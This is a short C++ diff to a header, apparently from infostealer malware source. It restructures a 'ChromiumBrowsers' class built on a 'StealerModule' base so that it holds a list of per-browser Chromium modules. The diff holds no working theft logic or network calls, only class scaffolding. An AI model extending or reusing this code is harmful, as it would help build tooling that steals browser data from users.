@@ -8,13 +8,15 @@
 
 #include "../../../StealerModule.h"
 #include "../BrowserModule.h"
-#include "../Browsers.h"
+#include "ChromiumBrowserModule.h"
 
-class ChromiumBrowsers : public StealerModule, Browsers {
+class ChromiumBrowsers : public StealerModule {
 public:
     ChromiumBrowsers();
 
     void execute(fs::path &root) override;
+protected:
+    std::list<ChromiumBrowserModule*> modules;
 };
 
 
